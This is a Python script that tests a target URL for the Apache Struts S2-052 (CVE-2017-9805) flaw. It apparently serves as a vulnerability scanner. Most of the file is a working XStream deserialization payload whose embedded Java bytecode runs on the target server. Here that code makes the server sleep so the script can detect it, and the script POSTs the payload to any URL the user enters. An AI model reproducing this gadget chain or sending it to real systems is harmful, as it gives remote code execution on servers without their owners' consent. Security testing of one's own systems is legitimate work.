import requests
import re
import urllib


def s2_052(url):
    relsult = {
        'name': 'S2-052 Remote Code Execution Vulnerablity(CVE-2017-9805)',
        'vulnerable': False
    }
    payload_sleep_based_10seconds = """
<map>
  <entry>
    <jdk.nashorn.internal.objects.NativeString>
      <flags>0</flags>
      <value class="com.sun.xml.internal.bind.v2.runtime.unmarshaller.Base64Data">
        <dataHandler>
          <dataSource class="com.sun.xml.internal.ws.encoding.xml.XMLMessage$XmlDataSource">
            <is class="javax.crypto.CipherInputStream">
              <cipher class="javax.crypto.NullCipher">
                <initialized>false</initialized>
                <opmode>0</opmode>
                <serviceIterator class="javax.imageio.spi.FilterIterator">
                  <iter class="javax.imageio.spi.FilterIterator">
                    <iter class="java.util.Collections$EmptyIterator"/>
                    <next class="com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl" serialization="custom">
                      <com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl>
                        <default>
                          <__name>Pwnr</__name>
                          <__bytecodes>
                            <byte-array>yv66vgAAADIAMwoAAwAiBwAxBwAlBwAmAQAQc2VyaWFsVmVyc2lvblVJRAEAAUoBAA1Db25zdGFu
dFZhbHVlBa0gk/OR3e8+AQAGPGluaXQ+AQADKClWAQAEQ29kZQEAD0xpbmVOdW1iZXJUYWJsZQEA
EkxvY2FsVmFyaWFibGVUYWJsZQEABHRoaXMBABNTdHViVHJhbnNsZXRQYXlsb2FkAQAMSW5uZXJD
bGFzc2VzAQA1THlzb3NlcmlhbC9wYXlsb2Fkcy91dGlsL0dhZGdldHMkU3R1YlRyYW5zbGV0UGF5
bG9hZDsBAAl0cmFuc2Zvcm0BAHIoTGNvbS9zdW4vb3JnL2FwYWNoZS94YWxhbi9pbnRlcm5hbC94
c2x0Yy9ET007W0xjb20vc3VuL29yZy9hcGFjaGUveG1sL2ludGVybmFsL3NlcmlhbGl6ZXIvU2Vy
aWFsaXphdGlvbkhhbmRsZXI7KVYBAAhkb2N1bWVudAEALUxjb20vc3VuL29yZy9hcGFjaGUveGFs
YW4vaW50ZXJuYWwveHNsdGMvRE9NOwEACGhhbmRsZXJzAQBCW0xjb20vc3VuL29yZy9hcGFjaGUv
eG1sL2ludGVybmFsL3NlcmlhbGl6ZXIvU2VyaWFsaXphdGlvbkhhbmRsZXI7AQAKRXhjZXB0aW9u
cwcAJwEApihMY29tL3N1bi9vcmcvYXBhY2hlL3hhbGFuL2ludGVybmFsL3hzbHRjL0RPTTtMY29t
L3N1bi9vcmcvYXBhY2hlL3htbC9pbnRlcm5hbC9kdG0vRFRNQXhpc0l0ZXJhdG9yO0xjb20vc3Vu
L29yZy9hcGFjaGUveG1sL2ludGVybmFsL3NlcmlhbGl6ZXIvU2VyaWFsaXphdGlvbkhhbmRsZXI7
KVYBAAhpdGVyYXRvcgEANUxjb20vc3VuL29yZy9hcGFjaGUveG1sL2ludGVybmFsL2R0bS9EVE1B
eGlzSXRlcmF0b3I7AQAHaGFuZGxlcgEAQUxjb20vc3VuL29yZy9hcGFjaGUveG1sL2ludGVybmFs
L3NlcmlhbGl6ZXIvU2VyaWFsaXphdGlvbkhhbmRsZXI7AQAKU291cmNlRmlsZQEADEdhZGdldHMu
amF2YQwACgALBwAoAQAzeXNvc2VyaWFsL3BheWxvYWRzL3V0aWwvR2FkZ2V0cyRTdHViVHJhbnNs
ZXRQYXlsb2FkAQBAY29tL3N1bi9vcmcvYXBhY2hlL3hhbGFuL2ludGVybmFsL3hzbHRjL3J1bnRp
bWUvQWJzdHJhY3RUcmFuc2xldAEAFGphdmEvaW8vU2VyaWFsaXphYmxlAQA5Y29tL3N1bi9vcmcv
YXBhY2hlL3hhbGFuL2ludGVybmFsL3hzbHRjL1RyYW5zbGV0RXhjZXB0aW9uAQAfeXNvc2VyaWFs
L3BheWxvYWRzL3V0aWwvR2FkZ2V0cwEACDxjbGluaXQ+AQAQamF2YS9sYW5nL1RocmVhZAcAKgEA
BXNsZWVwAQAEKEopVgwALAAtCgArAC4BAA1TdGFja01hcFRhYmxlAQAeeXNvc2VyaWFsL1B3bmVy
MTY3MTMxNTc4NjQ1ODk0AQAgTHlzb3NlcmlhbC9Qd25lcjE2NzEzMTU3ODY0NTg5NDsAIQACAAMA
AQAEAAEAGgAFAAYAAQAHAAAAAgAIAAQAAQAKAAsAAQAMAAAALwABAAEAAAAFKrcAAbEAAAACAA0A
AAAGAAEAAAAuAA4AAAAMAAEAAAAFAA8AMgAAAAEAEwAUAAIADAAAAD8AAAADAAAAAbEAAAACAA0A
AAAGAAEAAAAzAA4AAAAgAAMAAAABAA8AMgAAAAAAAQAVABYAAQAAAAEAFwAYAAIAGQAAAAQAAQAa
AAEAEwAbAAIADAAAAEkAAAAEAAAAAbEAAAACAA0AAAAGAAEAAAA3AA4AAAAqAAQAAAABAA8AMgAA
AAAAAQAVABYAAQAAAAEAHAAdAAIAAAABAB4AHwADABkAAAAEAAEAGgAIACkACwABAAwAAAAiAAMA
AgAAAA2nAAMBTBEnEIW4AC+xAAAAAQAwAAAAAwABAwACACAAAAACACEAEQAAAAoAAQACACMAEAAJ
</byte-array>
                            <byte-array>yv66vgAAADIAGwoAAwAVBwAXBwAYBwAZAQAQc2VyaWFsVmVyc2lvblVJRAEAAUoBAA1Db25zdGFu
dFZhbHVlBXHmae48bUcYAQAGPGluaXQ+AQADKClWAQAEQ29kZQEAD0xpbmVOdW1iZXJUYWJsZQEA
EkxvY2FsVmFyaWFibGVUYWJsZQEABHRoaXMBAANGb28BAAxJbm5lckNsYXNzZXMBACVMeXNvc2Vy
aWFsL3BheWxvYWRzL3V0aWwvR2FkZ2V0cyRGb287AQAKU291cmNlRmlsZQEADEdhZGdldHMuamF2
YQwACgALBwAaAQAjeXNvc2VyaWFsL3BheWxvYWRzL3V0aWwvR2FkZ2V0cyRGb28BABBqYXZhL2xh
bmcvT2JqZWN0AQAUamF2YS9pby9TZXJpYWxpemFibGUBAB95c29zZXJpYWwvcGF5bG9hZHMvdXRp
bC9HYWRnZXRzACEAAgADAAEABAABABoABQAGAAEABwAAAAIACAABAAEACgALAAEADAAAAC8AAQAB
AAAABSq3AAGxAAAAAgANAAAABgABAAAAOwAOAAAADAABAAAABQAPABIAAAACABMAAAACABQAEQAA
AAoAAQACABYAEAAJ</byte-array>
                          </__bytecodes>
                          <__transletIndex>-1</__transletIndex>
                          <__indentNumber>0</__indentNumber>
                        </default>
                        <boolean>false</boolean>
                      </com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl>
                    </next>
                  </iter>
                  <filter class="javax.imageio.ImageIO$ContainsFilter">
                    <method>
                      <class>com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl</class>
                      <name>newTransformer</name>
                      <parameter-types/>
                    </method>
                    <name>foo</name>
                  </filter>
                  <next class="string">foo</next>
                </serviceIterator>
                <lock/>
              </cipher>
              <input class="java.lang.ProcessBuilder$NullInputStream"/>
              <ibuffer/>
              <done>false</done>
              <ostart>0</ostart>
              <ofinish>0</ofinish>
              <closed>false</closed>
            </is>
            <consumed>false</consumed>
          </dataSource>
          <transferFlavors/>
        </dataHandler>
        <dataLen>0</dataLen>
      </value>
    </jdk.nashorn.internal.objects.NativeString>
    <jdk.nashorn.internal.objects.NativeString reference="../jdk.nashorn.internal.objects.NativeString"/>
  </entry>
  <entry>
    <jdk.nashorn.internal.objects.NativeString reference="../../entry/jdk.nashorn.internal.objects.NativeString"/>
    <jdk.nashorn.internal.objects.NativeString reference="../../entry/jdk.nashorn.internal.objects.NativeString"/>
  </entry>
</map>
"""
    headers = {
        'User-Agent': 'Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2228.0 Safari/537.36',
        'Referer': str(url),
        'Content-Type': 'application/xml',
        'Accept': '*/*'
    }
    vulurl = urllib.parse.urljoin(url, '/orders.xhtml')
    try:
        req = requests.get(vulurl, timeout=3)
        req2 = requests.get(urllib.parse.urljoin(url, '/asdjyjansa'), timeout=3)
        if req.status_code == 200 and req2.status_code == 200:
            return relsult
        pass
    except:
        return relsult
    timeout = 8
    try:
        requests.post(vulurl, data=payload_sleep_based_10seconds, headers=headers, verify=False, timeout=timeout,
                      allow_redirects=False)
        # if the response returned before the request timeout.
        # then, the host should not be vulnerable.
        # The request should return > 10 seconds, while the timeout is 8.
        return relsult
    except Exception:
        relsult['vulnerable'] = True
        relsult['method'] = 'POST'
        relsult['url'] = vulurl
        relsult['exp'] = True
        relsult['about'] = 'https://github.com/Lone-Ranger/apache-struts-pwn_CVE-2017-9805/blob/master/apache-struts-pwn.py'
        return relsult



if __name__ == '__main__':
    url = input('输入目标URL:')
    print(s2_052(url))
